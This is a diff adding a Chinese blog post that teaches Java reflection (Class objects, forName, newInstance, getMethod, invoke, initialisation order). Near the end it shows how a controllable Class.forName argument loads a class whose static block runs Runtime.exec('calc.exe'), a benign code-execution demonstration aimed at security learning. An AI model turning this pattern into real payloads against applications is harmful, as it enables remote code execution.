@@ -233,6 +233,490 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/10/04/java%E5%8F%8D%E5%B0%84/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="https://avatars.githubusercontent.com/u/47177122?v=4">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="我是GG还是MM">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2021/10/04/java%E5%8F%8D%E5%B0%84/" itemprop="url">java反射</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2021-10-04T14:13:11+08:00">
+                2021-10-04
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="0x01-反射"><a href="#0x01-反射" class="headerlink" title="0x01 反射"></a>0x01 反射</h1><p>反射的主要用途：</p>
+<ul>
+<li>在运行时判断任意一个对象所属的类；</li>
+<li>在运行时构造任意一个类的对象；</li>
+<li>在运行时判断任意一个类所具有的成员变量和方法（通过反射甚至可以调用private方法）；</li>
+<li>在运行时调用任意一个对象的方法</li>
+</ul>
+<p>这里举个简单例子：</p>
+<p>通过re.properties配置文件来调用其方法</p>
+<p>re.properties</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">classfullpath = com.yicunyiye.Cat</span><br><span class="line">method = hi</span><br></pre></td></tr></table></figure>
+
+
+
+<p>然后创建com.yicunyiye包加Cat类型。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.yicunyiye;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Cat</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name = <span class="string">&quot;Tom&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">hi</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;hi &quot;</span>+name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>通过传统方法调用：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Cat cat = <span class="keyword">new</span> Cat();</span><br><span class="line">cat.hi();</span><br></pre></td></tr></table></figure>
+
+
+
+<p>通过反射调用</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.yicunyiye.reflection.question;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.yicunyiye.Cat;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileNotFoundException;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.Properties;</span><br><span class="line"></span><br><span class="line"><span class="meta">@SuppressWarnings(&#123;&quot;all&quot;&#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ReflectionQuestion</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">//1.传统方法</span></span><br><span class="line">        Cat cat = <span class="keyword">new</span> Cat();</span><br><span class="line">        cat.hi();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//2.使用Properties类，这个类可以读写配置文件</span></span><br><span class="line">        Properties properties = <span class="keyword">new</span> Properties();</span><br><span class="line">        properties.load(<span class="keyword">new</span> FileInputStream(<span class="string">&quot;src\\re.properties&quot;</span>));</span><br><span class="line">        String classfullpath = properties.get(<span class="string">&quot;classfullpath&quot;</span>).toString();</span><br><span class="line">        String methodname = properties.get(<span class="string">&quot;method&quot;</span>).toString();</span><br><span class="line">        System.out.println(<span class="string">&quot;classfullpath= &quot;</span> + classfullpath);</span><br><span class="line">        System.out.println(<span class="string">&quot;method = &quot;</span> + methodname);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建对象</span></span><br><span class="line">        <span class="comment">//new classfullpath()  这样是不行的因为classfullpath是一个字符串</span></span><br><span class="line">        <span class="comment">//(1)加载类    返回一个Class类型的对象</span></span><br><span class="line">        Class clazz = Class.forName(classfullpath);</span><br><span class="line">        <span class="comment">//(2)通过clazz对象得到你加载的这个类com.yicunyiye.Cat的对象实例</span></span><br><span class="line">        Cat o = (Cat)clazz.newInstance();</span><br><span class="line">        <span class="comment">//(3)通过clazz得到你加载类的methodname的方法对象,在反射中方法也是对象。</span></span><br><span class="line">        Method method = clazz.getMethod(methodname);</span><br><span class="line">        <span class="comment">//(4)通过method来调用方法,就是通过方法对象来实现调用方法</span></span><br><span class="line">        method.invoke(o);   <span class="comment">//传统:对象.方法() 反射:方法.invoke(对象)</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>现在在Cat类添加一个新方法cry</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.yicunyiye;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Cat</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name = <span class="string">&quot;Tom&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">hi</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;hi &quot;</span>+name);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">cry</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(name + <span class="string">&quot;喵~&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>如何在不修改源码情况下调用cry方法也就是不需要从传统的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat.hi() ===&gt; cat.cry()</span><br></pre></td></tr></table></figure>
+
+<p>而是只需要修改配置文件即可。</p>
+<h2 id="1-1-Class类"><a href="#1-1-Class类" class="headerlink" title="1.1 Class类"></a>1.1 Class类</h2><p>先声明一个实体类</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//实体类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> id;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">User</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">User</span><span class="params">(String name, <span class="keyword">int</span> age, <span class="keyword">int</span> id)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">        <span class="keyword">this</span>.id = id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getAge</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAge</span><span class="params">(<span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getId</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setId</span><span class="params">(<span class="keyword">int</span> id)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.id = id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;User&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, age=&quot;</span> + age +</span><br><span class="line">                <span class="string">&quot;, id=&quot;</span> + id +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>一个类在内存中只有一个Class对象，所以c234的hashcode都是一样的。</p>
+<p>一个类被加载后，类的整个结构都会被封装在Class对象中。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Demo01</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException </span>&#123;</span><br><span class="line">        Class c1 = Class.forName(<span class="string">&quot;com.reflection.User&quot;</span>);</span><br><span class="line">        System.out.println(c1);</span><br><span class="line"></span><br><span class="line">        Class c2 = Class.forName(<span class="string">&quot;com.reflection.User&quot;</span>);</span><br><span class="line">        Class c3 = Class.forName(<span class="string">&quot;com.reflection.User&quot;</span>);</span><br><span class="line">        Class c4 = Class.forName(<span class="string">&quot;com.reflection.User&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//一个类在内存中只有一个Class对象</span></span><br><span class="line">        System.out.println(c2.hashCode());</span><br><span class="line">        System.out.println(c3.hashCode());</span><br><span class="line">        System.out.println(c4.hashCode());</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<ul>
+<li>Class本身也是一个类</li>
+<li>Class对象只能由系统建立对象</li>
+<li>一个加载的类在JVM中只会有一个Class实例</li>
+<li>一个Class对象对应的是一个加载到JVM中的一个.class文件</li>
+<li>每个类的实例都会记得自己是由那个Class实例所生成</li>
+<li>通过class可以完整的得到一个类的所有被加载的结构</li>
+<li>Class类是Reflection的根源，针对任何你想动态加载，运行的类，唯有先获得相应的Class对象</li>
+</ul>
+<p><img src="https://github.com/yicunyiye/img/blob/master/image-20210817221750924.png?raw=true"></p>
+<p>得到Class类的几种方法。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">package com.reflection;</span><br><span class="line"></span><br><span class="line">public class Demo02 &#123;</span><br><span class="line">    public static void main(String[] args) throws ClassNotFoundException &#123;</span><br><span class="line">        Person person = new Student();</span><br><span class="line">        System.out.println(&quot;这个人是:&quot;+person.name);</span><br><span class="line"></span><br><span class="line">        //方式一：通过对象获得</span><br><span class="line">        Class c1 = person.getClass();</span><br><span class="line">        System.out.println(c1.hashCode());</span><br><span class="line"></span><br><span class="line">        //方式二：forname获得</span><br><span class="line">        Class c2 = Class.forName(&quot;com.reflection.Student&quot;);</span><br><span class="line">        System.out.println(c2.hashCode());</span><br><span class="line"></span><br><span class="line">        //方式三：通过类名.class获得</span><br><span class="line">        Class c3 = Student.class;</span><br><span class="line">        System.out.println(c3.hashCode());</span><br><span class="line"></span><br><span class="line">        //方式四：基本内置类型的包装类都有一个Type属性</span><br><span class="line">        Class c4 = Integer.TYPE;</span><br><span class="line">        System.out.println(c4);</span><br><span class="line"></span><br><span class="line">        //获得父类的类型</span><br><span class="line">        Class c5 = c1.getSuperclass();</span><br><span class="line">        System.out.println(c5);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Person&#123;</span><br><span class="line">    public String name;</span><br><span class="line"></span><br><span class="line">    public Person() &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public Person(String name) &#123;</span><br><span class="line">        this.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public String toString() &#123;</span><br><span class="line">        return &quot;Person&#123;&quot; +</span><br><span class="line">                &quot;name=&#x27;&quot; + name + &#x27;\&#x27;&#x27; +</span><br><span class="line">                &#x27;&#125;&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Student extends Person&#123;</span><br><span class="line">    public Student()&#123;</span><br><span class="line">        this.name = &quot;学生&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Teacher extends Person&#123;</span><br><span class="line">    public Teacher()&#123;</span><br><span class="line">        this.name = &quot;老师&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>只要元素类型与维度一样，就是同一个class。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">int[] a = new int[10];</span><br><span class="line">int[] b = new int[100];</span><br><span class="line">System.out.println(a.getClass().hashCode());</span><br><span class="line">System.out.println(b.getClass().hashCode());</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="1-2-获取类"><a href="#1-2-获取类" class="headerlink" title="1.2 获取类"></a>1.2 获取类</h2><ul>
+<li><p>获取类的方法：<code>forName</code></p>
+</li>
+<li><p>实例化类的对象的方法：<code>newInstance</code></p>
+</li>
+<li><p>获取函数的方法：<code>getMethod</code></p>
+</li>
+<li><p>执行函数的方法：<code>invoke</code></p>
+</li>
+</ul>
+<p>这里要注意：<code>invoke</code>的作用是执行方法，他的第一个参数：</p>
+<ul>
+<li>如果这个方法是一个普通方法，那么第一个参数就是类对象</li>
+<li>如果这个方法是一个静态方法，那么第一个参数就是类</li>
+</ul>
+<h2 id="1-获取类"><a href="#1-获取类" class="headerlink" title="1. 获取类"></a>1. 获取类</h2><p>这里先来创建一个Person类：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> age;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> a+b;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>forName不是唯一的方法。</p>
+<h3 id="1-1-forName"><a href="#1-1-forName" class="headerlink" title="1.1 forName"></a>1.1 <strong>forName</strong></h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Class clazz = Class.forName(<span class="string">&quot;com.yicunyiye.servlet.Person&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+
+
+<p>这里forName还存在一个封装方式</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">forName(String name, <span class="keyword">boolean</span> initialize,ClassLoader loader)</span><br></pre></td></tr></table></figure>
+
+<p>这里的</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Class.forName(String name)</span><br><span class="line"><span class="comment">//等于</span></span><br><span class="line">Class.forName(className, <span class="keyword">true</span>, currentLoader)</span><br></pre></td></tr></table></figure>
+
+
+
+<p>这里第一个参数是类名，第二个参数是表示是否初始化，第三个参数是ClassLoader.</p>
+<p>第二个参数常常容易误解，比如在我们<code>forName</code>的时候，构造函数并不会执行，即使我们设置了<code>initialize=true</code>，那么这里的初始化是什么呢？</p>
+<p>这里我们来写一个Test类：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;代码块&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;静态代码块&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Test</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;构造方法&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> Test();</span><br></pre></td></tr></table></figure>
+
+
+
+<p>运行结果：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">静态代码块</span><br><span class="line">代码块</span><br><span class="line">构造方法</span><br></pre></td></tr></table></figure>
+
+
+
+<p>可以看到最开始运行的是<code>static&#123;&#125;</code>然后是<code>&#123;&#125;</code>,最后才是构造方法。其中<code>static&#123;&#125;</code>就是在“类初始化”的时候调用的。<code>&#123;&#125;</code>会在构造方法<code>super()</code>后，当前构造函数前执行的。</p>
+<p>这里的初始化就是告诉java虚拟机是否执行”类初始化”。</p>
+<p>假如说有如下代码，name值可控。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">ref</span><span class="params">(String name)</span> <span class="keyword">throws</span> ClassNotFoundException </span>&#123;</span><br><span class="line">    Class.forName(name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>我们就可以构造一个恶意代码放入<code>static&#123;&#125;</code></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime rt = Runtime.getRuntime();</span><br><span class="line">            String command = <span class="string">&quot;calc.exe&quot;</span>;</span><br><span class="line">            Process pc = rt.exec(command);</span><br><span class="line">            pc.waitFor();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException | InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.yicunyiye.servlet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestRuntime</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException </span>&#123;</span><br><span class="line">        TestRuntime testRuntime = <span class="keyword">new</span> TestRuntime();</span><br><span class="line"><span class="comment">//        testRuntime.ref(&quot;com.yicunyiye.servlet.Test&quot;);</span></span><br><span class="line">        <span class="keyword">if</span>(args.length == <span class="number">1</span>)&#123;</span><br><span class="line">            <span class="keyword">for</span> (String arg : args) &#123;</span><br><span class="line">                testRuntime.ref(arg);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">ref</span><span class="params">(String name)</span> <span class="keyword">throws</span> ClassNotFoundException </span>&#123;</span><br><span class="line">        Class.forName(name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime rt = Runtime.getRuntime();</span><br><span class="line">            String command = <span class="string">&quot;calc.exe&quot;</span>;</span><br><span class="line">            Process pc = rt.exec(command);</span><br><span class="line">            pc.waitFor();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException | InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://github.com/yicunyiye/img/blob/master/image-20210830235528233.png?raw=true"></p>
+<h3 id="1-2-getClass"><a href="#1-2-getClass" class="headerlink" title="1.2 getClass()"></a>1.2 getClass()</h3><p>这个是通过对象获得</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Person person = <span class="keyword">new</span> Person();</span><br><span class="line">Class c1 = person.getClass();</span><br><span class="line">System.out.println(c1);</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="1-3-通过类名-class"><a href="#1-3-通过类名-class" class="headerlink" title="1.3 通过类名.class"></a>1.3 通过类名.class</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Class personClass = Person.class;</span><br><span class="line">System.out.println(personClass);</span><br></pre></td></tr></table></figure>
+
+
+
